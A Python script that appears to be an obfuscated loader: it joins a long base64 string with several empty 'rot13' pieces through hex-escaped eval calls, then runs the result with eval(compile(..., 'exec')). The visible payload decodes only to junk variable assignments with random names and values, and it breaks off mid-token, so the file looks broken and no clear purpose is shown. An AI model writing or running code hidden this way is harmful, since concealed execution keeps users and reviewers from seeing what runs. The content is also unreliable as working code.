import base64, codecs
magic = 'cjE2MzY0ODE0NjAyMTk1MDQyMDIgPSAyODMKUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVEgPSAidGR6b3prd1NhRnZBVE9GdVViZVJFS2l5aEl3VnpndE9CV0laZWxvbHhaVFZmZW9ycXdsR0JsTFZmV3dtR1BzeVVDUkhRcllDYW9wS2pwaCIKbzE5OCA9IDEzNwpHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHID0gMjY3CmR4VlBmc2FNRkRsbVVVdGRxR0ltVXluVm1LQ21xVWJ0SHZNb0hvUldxdGVXaGhtTVNiVlB4UUxkZXJiTkZtaUV0T011TmlLbGRoeXdCTFoxOTQgPSA0NDUKbGxsSUlsbGxsSWxJSWxsbElsbGxJbElJbElsSUlsSWxsbElsbElsbElsbElJSWxsbGxsSWxJbGxsSUlJSWxsbGxsSUlsbElsbElsSWxJbGxsbGxsbGxJSWxJSWxJSUlJbElsSUlsSWxJbGxJbGxJSUlJSWxsbGxJSWxJbGxJbGxsSUlJbGxJbGxJbElsbElJbGxJbElJSUlJSWxJSUlJbElJSUlJbGxJSUlJbGxsSWxsbElJSUlJSWxsbElsSUlJID0gIkVjRmpnZVlKYXFxeXZES1FQek92ZVBpYVV5Ykxvakx6T1VqQ0xvUGNzWVdicGpXSkVlaGpBYnBWdnV6S1VnS2dhU25UZEdWUkNmVWN2ZXgiCkVsSmVrWEdoV0Z0TXBncGZVa0FIWGZzdE5TYU1PZFp2S2NOZEdicVVhaGZDWWdhY29Fb1RmeVZTS2dkT2V6TnZ5YXlTQXR6UUd3eVlmR0gxOTAgPSA0MTMKUGRZeHJnZk9DdWduR05KY2hqSlJBWEVBbHR1b1NtcVNFekVTVk5DbmZjd2JJR1RBT1ZnZkdOSVpCS1hLanVDRFNvTFFIQ3pORGFNTERsbjE4OCA9ICJqZ3pZemt4ellhemRMZm1oZU5EY0F3aG1UZFZpanFVTlNhemVoWUN4cklrUWhwcGVoSUlreGZZTGpwck50Qm5IRHB3RWh2eEFtYlVTR1F0IgpBYWFhYWFBYWFhQWFhYUFhYUFhQUFhQWFBYWFBYWFBQUFhQWFBQUFBYUFhQWFhQUFBQWFBYUFhYUFhYWFBYWFBQUFhQWFBQUFhYWFhQUFBYUFBYUFhYWFhYUFBQUFBQUFhQUFhQWFBQWFhYWFhYWFhQUFhYWFBYUFBQWFBYWFBQWFBQUFBQUFBYUFhQWFhQUFhQWFhYUFhQWFBYWFhQWFhQUFhQWFBQWFBQUFBYUFhQWFhYWFBQWFBYWEgPSAicW1DU0RXS3d0Y3FuaGdDZ2tldGRJSVRrY1JhVHVBWEp5bURUanRxc2tSQlBpT1VDd05KUUpnanZMVmpFQ1lla0NTdUd1RlVCTXJWUEZWZyIKeXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eSA9ICJVaHdoS2pUc2p2dW5wRG9WZGllTFZ2UW5YRGhDZGFZdmpmTlFiUHZ3U3d3dGl4TUdvdlBuRHlIeVdCQlhOcEdvZkhTQUtjelFpVmtqSWtQIgpzMTgyID0gIkZWemxlQWZkd0tkbE1Da09zQVZHR0pETWVaelhUeG5hSmNMcE1zc1VuSlZSd1lSd0d2Yk94dG9senZEaXVyZ0lxenJVVVZFQ1JleldIZm4iCmFBYUFhQUFhYWFhQUFhYUFhYUFBQWFhQWFhYWFBQWFBYWFhQUFBQUFhQWFBYUFhQUFhQUFhQUFhQWFhYWFBQUFhYWFhQWFhYWFBYWFhQWFhYUFhYWFBQUFBQUFhYWFhYWFhYWFBQWFhYUFhQUFBQWFhQWFhYUFBYUFhQUFhYUFBYUFhYUFhYWFBQWFhQUFhYWFBQWFBYWFBYUFBQWFBQWFBQUFBYWFBYUFhQWFhQUFBQWFhQSA9ICJDY09sR3pUelNXTld2bHV0T0ZiSFFneWNkV1hTWWNxYUlsekhNR2ZwcEF3QVVsYXlZWHBtQUduUGRxS3BzbndmTldnRFVHSUJVcUFNVVZtIgpDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDID0gMTAxCnQxNzYgPSAzMzYKSUlJbGxsbElJbElJSWxJSWxJSUlJSUlJbGxsbElsbElsbElsbElJSUlsbElsbElJbGxsbGxJbGxJSUlsbGxsbGxJSWxJSUlsbElJSUlJSWxJSUlsbElJSUlJbGxsbElJbElsbGxJbElsbGxJSWxsSUlJbGxsbGxsSUlJSUlJbGxsSWxJSWxsSUlsSWxsSWxJbGxJSWxsbGxsSWxJbGxsSUlsbElJbElsbGxsSUlsID0gMzkwCk1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU0gPSAibUVXTUpQVGNxS2dCcXlKWUxMbUdnZllYWm5aRHZkR2pYZGN1T05SQXpRWFdpWmlvYm5PV1BlRHBoUHBNampqZU9meEZ1bXl6WXJkemhoYSIKZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWUgPSAyODUKYmFtVnFsYWRmZktjWHdnbFJFbnBFcFFraW1JZG1VTXlHTW5yVFdQU3ZjaEplZVNValp1Z2x6TlByeEpCTldaUW9HTmhXRkliRHZyQ1VuYzE2OCA9IDI5NQpNMTYzNjQ4MTQ2MDIxNjYxMDcxNjYgPSA0NTcKSTE2NCA9IDUwCkoxNjIgPSA2NDkKbGxsSWxJSWxJbGxJbElJbElJSUlsSUlsSWxsbElJbElJSUlsbGxJSUlJSUlJSWxJSWxsSWxJbElJbElsSWxJSWxJbElJbGxJbElsbElJbElsSUlsbGxJbElJbGxsSWxsSUlJbElJbElsSWxsSUlJSUlJSUlsbGxJbElsSUlsbGxJSWxJbGxJSWxJSUlsSUlJSUlJbElJSUlsSUlJbElJSSA9IDIwOQpobVZZdGNVZUJYVHBiQ2pKRFNOZlVwbkJvd2NRb3R0R2xwcU16Z3FxeEV3dm92V2VIUnBiTVF1dmtyRXF1RGpIblRjaURoZU9SZnFWZ0hCMTU4ID0gMjgzCkRERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERCA9IDM5OQppaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpID0gIk52YVRsa2lNVUJpcXB4RHJGeXJxbUJnUExPd3FRbWZ0SlVsbm1qREh4dmdTSExrZnhBd2FDeWloUW11dEVrYXRmQXllTG9ETXNBQkRudkoiCklJbElJbGxJbGxJbGxsbGxsSWxJbGxJbGxsbGxJbElsSWxsbElJbElsbElsbElsSUlJSUlJSWxsSWxsSUlsbElsSWxJbGxsbElsbElJSWxsbElsSUlsbElJSWxJbGxJbGxJSWxsSWxsSWxsSUlsSUlsbElJSWxJbElsSUlJSWxsSUlJbGxJSWxsbGxJSUlsbElsbGxsSWxsID0gIm5xUmduald0a01nZElRcGVUdWJrTmRUVGxWd3F0UnducVdsS0psSWhCZ1pLYXp5bnBVbGlJSVZsYmJZZU5kaUNraHdoTEJhTFFac1NkV0giCmFhYWFBQWFBYWFBYWFBQWFhYWFhQUFhYWFBQWFhYWFBYWFhQWFhQUFhYWFBQWFhQUFBQUFhQWFBQWFBYUFBYUFBQUFBYWFhYWFBYUFBQWFBQWFhQWFhYWFBQWFBQWFBYWFhYWFhYWFhYWFhYWFBYWFhYUFBYWFhQWFBQUFhQUFBYWFhYUFBQWFhQWFhQUFBQUFBYUFhQSA9ICJ1Z2hVbUhkZ3FuTE9uWENBa0VTSW92SXlnSEZPeXdjaEN5ZWlkS2tGWU5odUNWaGJsTHloR2NzQXlEZWhkbGtIVllucEdwY2hMcEFtelJmIgpBYUFBQUFhYWFBQWFBYWFhYUFBQWFBYUFhYWFBQUFhYUFBQUFhQWFBYWFBYUFBQWFhQUFBQWFBQUFBQWFhQUFBQWFBQUFhQWFBQWFBQWFhQWFhQUFBYUFBQUFBYUFBYUFhYWFhYWFBYWFBQUFhYWFhYWFBQWFBQWFBQUFhYUFhYUFhQUFBYUFBQWFhQWFhQUFBQUFhID0gInRhWkRBYmFEWk9HY1loUGV1Z09IUkxYUEtBWnFjdFpWVHpqUk1iQXNzb0lSWVJoTlNMY2FJcXR2empQbGFDQlBmS1F2cmNkbW9jd3hlakIiCnIxNjM2NDgxNDYwMjE1MDYxMjE0NiA9IDc5MwpUMTQ0ID0gMzMyCklJbGxJbElsbGxJbGxJbElsbGxsbElsSWxJbGxsSWxJSUlJSWxJbElJbGxJSUlJbElsSUlsSWxsbGxsbElJSWxJbGxsSUlsbGxsSWxsbGxsbGxsbElsSUlsbElsbGxJbElJSUlJbElJSWxsSWxsSWxJbGxJbElJSWxsbElJbElsSUlsbGxsSUlJSWxJSUkgPSAid2NJSFJzR1JkWHhVT3VuUG9XaFR3d1FKaEVrTm1mR1R0Z0Znc1pvcFJJWW5PYk50b2tsTFdYZHVNZktURGpETGVmdWt0eFFNYmRQWHNQQiIKSFBQRWdvdUZIbXJyV296eExTeFFIV1NLSEV1Q21OS2dFZnFITHhmS2xKUXBOQXZVaFhYakVOTXNNTElqRGN6c0V4WkpickhyQ0dMUXFLVDE0MCA9IDE0MwpSMTYzNjQ4MTQ2MDIxNDU0NTEzOCA9ICJlaVVlUE1nZm5rUUV3ZllFak1wZkF4QlFuZGx1WUttTE53Ykxnc1BVSHliSXB4d0VLVkJpTVZDaXdTZ0FzS1lsUXlRZ05mdGxXakFCTmhUIgpBYUFBYUFhQUFhYWFBQWFhYWFhQUFhQUFBYWFBQWFhYWFBYUFBYUFhYWFBYUFhYUFBQWFBYWFBQUFBYUFBYUFhQWFBYWFBYUFhQWFBYUFhQUFBQWFBYWFBQWFBYWFhQWFhQUFBYUFhYWFhQWFBYWFhYWFhYWFBYWFBQUFBYWFBYWFBYUFhQUFBID0gNTg4CklsbElJbGxsSWxJSUlJSWxsbElJbElsbGxsSWxJbElJSWxJbElsSWxsbGxsSUlsbElsbGxsSUlsSWxsbElsbElsbElJbGxsSWxJSUlsbElsSUlsSWxsSWxJSUlsSUlJSUlsSWxJSWxsbElsSUlsbElJSUlsSUlsSWxsbGxJSWxsSUlJSUlsID0gIk1OUlFUeGFzWXpsblFZZWVlcExVTlJ3YWloTXhNaE5tSXVrU0dBaHl2T2lLd0FWSm1HcXBqZHpnWXpUZVFmVUpIeVJIV0VjTVhZSUFhRUkiCmxsbGxsSWxsbGxsbElsSWxJbGxsSWxJSUlsbGxsSUlJbGxsSWxsbGxJbElJbElsSWxsSUlsSWxsbElJbElsSUlJbGxJSUlsSWxJbGxsSUlsSUlsSUlsbElsbElJbElJSUlsSUlsSUlsbGxJbGxsbGxJSWxJSWxJSWxJbElsbGxJSWxsbCA9IDc2NgpUaXVOUUFwUk9obnBXRXV4dUZPZXVoaVJLdHJRSUxFdllkeHBwbGF6TWp1dmlteGlGc0lZa1B1UFZvakVlVHBpRHBnVXRLclhHZUliUnVqMTMwID0gImNvclJ6dVh0RGhGUWt0Y2F6aHFRU0NNVWRYUkFDSWJrdmN3eVNRcFZURld0Rmt1RVFHWE9VR3NtWUhFRFdmTUphemVhenJaSEFqV1RZckkiCklJSWxsbElJSWxJSWxsSWxJbElsSUlJSUlsbElsSWxJbGxsSUlJbElJSUlJbElsSUlsSUlsbElsbElsbGxJbElJSWxsbElsSUlsbElJSUlsbElsbElJbGxsbElJbElsbElsSUlsSWxJSUlsSWxJSWxJSUlsbGxsSUlsSWxJbGxsID0gInBxQ0dRenNOZHBTSFJzQnRidW9abG52Qkx6R3dPYlpEeXJXZXFrUnBUQU5Pc1hMdk5VQUhDT0lzWVF0YXV1TkxObktqSHNWVG5UT2lsVkYiCkYxNjM2NDgxNDYwMjEzNjY0ODEyNiA9IDEzNgp6UnVxQmlucERLT010cm5Ea2RhQW1QcFd3R1VnbExuVnl3RE12RUJYYm9ubG9Hdm52c29FUWhCY3pqTmNEdWhLalFOb2FWTkdieUZTR2ZwMTI0ID0gNDM4CkExNjM2NDgxNDYwMjEzMzc5NDEyMiA9ICJ3TVppa3VpakVMbHFySHZGbUVwZ2JNc0ZtU3pacUV1QkxYSEZxTWhlbFprYU11b0dQREpSZXJ3b2ZFdW9ab1NacmlrUGJ3Y2lUWFJxQWNwIgpqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqamogPSAzMzYKUzExOCA9IDU2NwpjMTYzNjQ4MTQ2MDIxMzAxMTE2ID0gIm9iRlpMZ3FjRHVtdUdFdUZhUldBb1RlQ1ZRU0VNb3dmdVRNUHJKSllURWZMaEZFc3B4ZnJRRE9tbHdRSXhSaUZyaWV1REtqcnVJZ3NNemwiCmFBQWFBQUFhQUFhQUFBQUFBQWFhYUFBYWFhQUFBQWFhYUFBQWFBYWFBQUFBQWFhQUFBQWFBYWFhQUFhQUFBQUFBYUFhQUFBYUFhYWFhQWFBQUFhQUFBQUFhYWFhQWFBQWFBQUFhQUFhYUFBYUFhQUFBYSA9ICJxWkJyenVPRUphWGZSRVZUQmtudFNnTnRLcWRWYWtyc3RsaFlNaGRPbGJleWxqdWt6TEl0VUVKVGZUbXBuSlFXTHFadG9UbGJHT2hwSFFXIgpYMTYzNjQ4MTQ2MDIxMjc0MjMxMTIgPSAiSUFDaU1ha1ZJV1NxdkFPVGpwa1VCS2RlZFl4QWJrSUxNRFFNQnp5ekxhekFSQ09YY2J5bGZ2QnBTUHZldkRDRktERGpzTHZTZlhLQWdPQSIKVjExMCA9ICJaWHBxek1zWHBtUk1JekplZm91SFZYQkhia3l3cWR6SU9KQUVVcFdlQ1d4d3lGVmlOdHp5d3hMWnBqbVdnalVNcW5kTlFLc0R3aW52d29mIgpJbGxsSWxJbGxsSUlsSWxJSUlsbGxsbElJSUlsSUlsbGxsbElsbElsbGxJSUlsSUlsbElJbGxJbElsbGxsbGxsbElsSWxsbElsSWxsSWxsSUlsSUlJbGxsSUlJbElJSUlsbGxJSUlsSUlJbEkgPSA5NDcKbGxJbElsSWxsbElJbGxJSWxsSUlJbGxsSUlsbElsbElsbElJSWxJbGxJSWxJSUlJbElsbElJbElJSWxsSUlsbGxJbGxJbGxsSUlsSUlsbGxJSWxsSUlJbElsbElJSUlsbElsbElJbElsSSA9ICJabEtpZFRHVmdKeFBZZndheWlvSHRTQmVHaWpCSG1KRHlBU1JJYlZmUHBFb2RURWhta2pCbE5wdUJDb2hDZVB1Z3lORW5JUW5zUGtQa2RVIgpTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTUyA9IDMyNQpFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUUgPSA3MTEKRDEwMCA9IDIzOApOTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTiA9IDM2NApjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2MgPSAxNjUKaDk0ID0gMTk0CkwxNjM2NDgxNDYwMjExOTExOTIgPSA2MzcKa3FxZnh3TXBDSmtiUlpxTk5OYUxvSU1jVVdmbVR5dnlZcHdvVEFqWGJDRXVBalpCZWFhb1RHQ0NCWU1uQmR1ZWdoQkdnamZyVUlKWlZIcjkwID0gNzQ5ClY4OCA9ICJWd2VZSXB4TXBLYWR3TlF5V01pQnh6aFN3U1psckdXRVlBWGdCb09pclpEdlJ2Y0xXanpsVWNKaGlIbll2enhyT0RmbVdrc09VeENYQ3R3IgpJSUlJSUlJbElJbGxJbElJSUlsSUlJbGxsSUlsbElJSWxJSWxsbGxJbGxsbGxJSUlsSUlsbElsbElJSWxJSWxJbGxsSWxJSWxsSWxJbElJSWxJbGxJbCA9IDQ5NgpjODQgPSAyOTAKSjgyID0gIk1lZ3BpalZLeUpZWG5seFZ6Vk5JWXdQZW1VaHZtZUhEcm5sQXFBaU5pbUdTbVVjTkxjU2luSEZuZmxFamhZeElnZGVhU2VYaU5vc3hqZGoiCmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiID0gImR1aUhsaGhZZW1uZmVSSnl5b3NiWlVjYlJaR2ZyY1FZZVJTa3RMWm52a0dlUFpxQXF4eUJSbFZlSlR3UmR4bGJObGVQaUJwdEVUbFZ1UHciCmxJbGxsSUlsSWxJbGxJSUlsbElsSUlsbGxsbElsSWxsSUlJSWxJSUlsbElJbGxJSWxsbElsSWxJbGxJbGxsSUlsSUlJSWxsbElsbGxsbCA9IDQwNgpUNzYgPSAzMzcKSUlJSUlJSWxJbElsSWxJbGxsbGxJbElJbGxsSWxsSUlJbGxJSUlsbElJSWxsbGxJbGxJbGxJSUlsSWxsbElsSWxsSWxJSUlsbGwgPSAicnNzdFhUTERvanpxcWxsTU9wSU9VR2VPWXppT25rRGlBVURIc1FWYkRnZnlNWlRUbXRjdlNpVnhzZE1vc2JPa3JiQ0dlTHlOZ2xIb2xUYiIKSUlJSUlsbElsSWxJSWxJSUlsbGxJSUlJSUlsbElsSUlsbElJbElsSWxJbGxsSUlJbGxsbGxsSWxsbElJbGxJSWxJbGxJbElJID0gImxQSEVuQW5jZU5KT3hJVG9qR0FhaElJSHp2WGxBUlpSdXlDUFNHd1lnQVFobG1jeGdMT3FRQ0diVXZmV2JaTlRxeGpSV0NIQ0VGdmVRTnAiCmxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGwgPSAiZ1F3U2VRRU9TSk14dlVQU1dheFBXZERIR2tLc2R0Q2tpSklTRXpqbWNHdGhieHZ1WmdvQXdQRWRESkRDWE5LYmtJUFhsWHdkWHVqWGZtSiIKQUFBQUFhQUFhYUFhYWFhYWFBYWFhYUFhQUFBYUFhQWFhYWFBQUFBYUFBQWFhYWFBYUFhYWFBQWFBYUFhQWFBYWFhQUEgPSAyNDkKbGx'
love = ''
god = ''
destiny = ''
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
